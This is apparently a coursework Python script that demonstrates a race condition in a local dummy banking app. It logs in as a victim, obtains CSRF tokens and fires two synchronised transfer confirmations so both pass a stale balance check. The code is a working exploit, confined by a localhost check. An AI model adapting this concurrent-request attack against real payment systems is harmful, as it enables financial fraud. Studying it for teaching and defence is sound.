"""
Local-only double-transfer race condition demo.

This coursework script demonstrates how two transfer confirmations sent at
almost the same time can both pass a stale balance check. It is intentionally
limited to the local dummy banking app at http://127.0.0.1:5000.

Demo scenario:
- Reset the victim account to GBP 100.00.
- Send two GBP 80.00 confirmations to mallory at the same time.
- If both requests pass, GBP 160.00 is transferred and the victim balance
  becomes GBP -60.00.
"""

from __future__ import annotations

import re
import sqlite3
import threading
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from http.cookiejar import CookieJar
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import urlparse

BASE_URL = "http://127.0.0.1:5000"
LOGIN_URL = f"{BASE_URL}/login"
TRANSFER_URL = f"{BASE_URL}/transfer"
TRANSACTIONS_URL = f"{BASE_URL}/transactions"
HEALTH_URL = f"{BASE_URL}/health"

DATABASE_PATH = Path(__file__).resolve().parent / "instance" / "bank.db"

VICTIM_USERNAME = "alice"
VICTIM_PASSWORD = "alice123"
ATTACKER_USERNAME = "mallory"

STARTING_BALANCE = 100.00
TRANSFER_AMOUNT = 80.00
REQUEST_COUNT = 2
TIMEOUT = 8
CSRF_FIELD = "csrf_token"


@dataclass
class TransferResult:
    request_id: int
    preview_ok: bool
    confirm_ok: bool
    status_code: int | None
    final_url: str
    evidence: str


@dataclass
class SimpleResponse:
    status_code: int
    url: str
    text: str


class SimpleSession:
    def __init__(self) -> None:
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(CookieJar())
        )

    def get(self, url: str, timeout: int = TIMEOUT) -> SimpleResponse:
        try:
            response = self.opener.open(url, timeout=timeout)
        except urllib.error.HTTPError as error:
            response = error

        with response:
            body = response.read().decode("utf-8", errors="replace")
            return SimpleResponse(response.status, response.geturl(), body)

    def post(self, url: str, data: dict[str, str], timeout: int = TIMEOUT) -> SimpleResponse:
        encoded = urllib.parse.urlencode(data).encode("utf-8")
        request = urllib.request.Request(url, data=encoded, method="POST")
        request.add_header("Content-Type", "application/x-www-form-urlencoded")
        try:
            response = self.opener.open(request, timeout=timeout)
        except urllib.error.HTTPError as error:
            response = error

        with response:
            body = response.read().decode("utf-8", errors="replace")
            return SimpleResponse(response.status, response.geturl(), body)


def assert_local_target() -> None:
    host = urlparse(BASE_URL).hostname
    if host not in {"127.0.0.1", "localhost"}:
        raise SystemExit("Refusing to run: this demo is restricted to localhost only.")


def connect_db() -> sqlite3.Connection:
    if not DATABASE_PATH.exists():
        raise SystemExit(f"Database not found: {DATABASE_PATH}")

    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def get_account(conn: sqlite3.Connection, username: str) -> sqlite3.Row:
    account = conn.execute(
        """
        SELECT accounts.id, accounts.balance, users.username
        FROM accounts
        JOIN users ON users.id = accounts.user_id
        WHERE users.username = ?
        """,
        (username,),
    ).fetchone()

    if account is None:
        raise SystemExit(f"Account not found for username={username}")

    return account


def reset_demo_balances() -> tuple[int, int]:
    with connect_db() as conn:
        victim = get_account(conn, VICTIM_USERNAME)
        attacker = get_account(conn, ATTACKER_USERNAME)
        conn.execute(
            "UPDATE accounts SET balance = ? WHERE id = ?",
            (STARTING_BALANCE, victim["id"]),
        )
        conn.execute(
            "UPDATE accounts SET balance = ? WHERE id = ?",
            (0.00, attacker["id"]),
        )
        conn.commit()
        return int(victim["id"]), int(attacker["id"])


def read_balances() -> tuple[float, float]:
    with connect_db() as conn:
        victim = get_account(conn, VICTIM_USERNAME)
        attacker = get_account(conn, ATTACKER_USERNAME)
        return float(victim["balance"]), float(attacker["balance"])


def extract_csrf_token(html: str) -> str | None:
    pattern = r'name=["\']csrf_token["\']\s+value=["\']([^"\']+)["\']'
    match = re.search(pattern, html, re.IGNORECASE)
    if match:
        return match.group(1)

    pattern = r'value=["\']([^"\']+)["\']\s+name=["\']csrf_token["\']'
    match = re.search(pattern, html, re.IGNORECASE)
    if match:
        return match.group(1)

    return None


def fetch_csrf_token(session: SimpleSession, url: str) -> str | None:
    response = session.get(url)
    return extract_csrf_token(response.text)


def login(session: SimpleSession) -> bool:
    csrf_token = fetch_csrf_token(session, LOGIN_URL)
    data = {
        "username": VICTIM_USERNAME,
        "password": VICTIM_PASSWORD,
    }
    if csrf_token:
        data[CSRF_FIELD] = csrf_token

    response = session.post(
        LOGIN_URL,
        data=data,
    )
    return "/dashboard" in response.url or "logout" in response.text.lower()


def preview_transfer(session: SimpleSession, attacker_account_id: int, note: str) -> str | None:
    csrf_token = fetch_csrf_token(session, TRANSFER_URL)
    data = {
        "to_account_id": str(attacker_account_id),
        "amount": f"{TRANSFER_AMOUNT:.2f}",
        "note": note,
        "action": "preview",
    }
    if csrf_token:
        data[CSRF_FIELD] = csrf_token

    response = session.post(
        TRANSFER_URL,
        data=data,
    )
    text = response.text.lower()
    if "review transfer" in text and "projected balance" in text:
        return extract_csrf_token(response.text) or csrf_token or ""
    return None


def confirm_transfer(
    request_id: int,
    attacker_account_id: int,
    note: str,
    start_gate: threading.Barrier,
) -> TransferResult:
    session = SimpleSession()
    if not login(session):
        return TransferResult(request_id, False, False, None, "", "login failed")

    csrf_token = preview_transfer(session, attacker_account_id, note)
    preview_ok = csrf_token is not None
    if csrf_token is None:
        return TransferResult(request_id, False, False, None, "", "preview failed")

    try:
        start_gate.wait(timeout=TIMEOUT)
    except threading.BrokenBarrierError:
        return TransferResult(request_id, preview_ok, False, None, "", "concurrency start barrier failed")

    response = session.post(
        TRANSFER_URL,
        data={
            **({CSRF_FIELD: csrf_token} if csrf_token else {}),
            "to_account_id": str(attacker_account_id),
            "amount": f"{TRANSFER_AMOUNT:.2f}",
            "note": note,
            "action": "confirm",
            "step_up_password": VICTIM_PASSWORD,
        },
    )

    text = response.text.lower()
    confirm_ok = (
        response.status_code == 200
        and "insufficient balance" not in text
        and (note.lower() in text or "transaction history" in text)
    )
    evidence = "completed" if confirm_ok else response.text[:240].replace("\n", " ")
    return TransferResult(request_id, preview_ok, confirm_ok, response.status_code, response.url, evidence)


def check_app_running() -> None:
    try:
        response = SimpleSession().get(HEALTH_URL, timeout=TIMEOUT)
    except (urllib.error.URLError, TimeoutError) as exc:
        raise SystemExit(
            "Local banking app is not reachable. Start it first with: python app.py\n"
            f"Request error: {exc}"
        ) from exc

    if response.status_code >= 400:
        raise SystemExit(f"Health check failed with HTTP {response.status_code}")


def transaction_evidence(session: SimpleSession, note_prefix: str) -> int:
    response = session.get(TRANSACTIONS_URL, timeout=TIMEOUT)
    return response.text.lower().count(note_prefix.lower())


def main() -> None:
    assert_local_target()
    check_app_running()

    victim_account_id, attacker_account_id = reset_demo_balances()
    before_victim, before_attacker = read_balances()
    note_prefix = f"race-demo-{datetime.now(timezone.utc).strftime('%Y%m%d%H%M%S')}"

    print("=== Double Transfer Race Demo ===")
    print(f"Victim: {VICTIM_USERNAME} account_id={victim_account_id}")
    print(f"Receiver: {ATTACKER_USERNAME} account_id={attacker_account_id}")
    print(f"Starting balances: {VICTIM_USERNAME}=GBP {before_victim:.2f}, {ATTACKER_USERNAME}=GBP {before_attacker:.2f}")
    print(f"Launching {REQUEST_COUNT} simultaneous confirmations of GBP {TRANSFER_AMOUNT:.2f}")
    print()

    start_gate = threading.Barrier(REQUEST_COUNT)
    with ThreadPoolExecutor(max_workers=REQUEST_COUNT) as executor:
        futures = [
            executor.submit(
                confirm_transfer,
                request_id,
                attacker_account_id,
                f"{note_prefix}-request-{request_id}",
                start_gate,
            )
            for request_id in range(1, REQUEST_COUNT + 1)
        ]
        results = [future.result() for future in futures]

    for result in results:
        print(
            f"[request {result.request_id}] "
            f"preview_ok={result.preview_ok} "
            f"confirm_ok={result.confirm_ok} "
            f"status={result.status_code} "
            f"final_url={result.final_url}"
        )

    after_victim, after_attacker = read_balances()

    verification_session = SimpleSession()
    login(verification_session)
    evidence_count = transaction_evidence(verification_session, note_prefix)

    successful_confirms = sum(1 for result in results if result.confirm_ok)
    total_requested = REQUEST_COUNT * TRANSFER_AMOUNT

    print()
    print("=== Result ===")
    print(f"Successful confirmations: {successful_confirms}/{REQUEST_COUNT}")
    print(f"Transaction notes visible on /transactions: {evidence_count}")
    print(f"Requested total: GBP {total_requested:.2f}")
    print(f"Final balances: {VICTIM_USERNAME}=GBP {after_victim:.2f}, {ATTACKER_USERNAME}=GBP {after_attacker:.2f}")

    if successful_confirms == REQUEST_COUNT and after_victim < 0:
        print("[!] Race condition reproduced: two GBP 80 transfers succeeded from a GBP 100 balance.")
    else:
        print("[*] Race condition was not fully reproduced in this run. Try running the script again.")


if __name__ == "__main__":
    main()
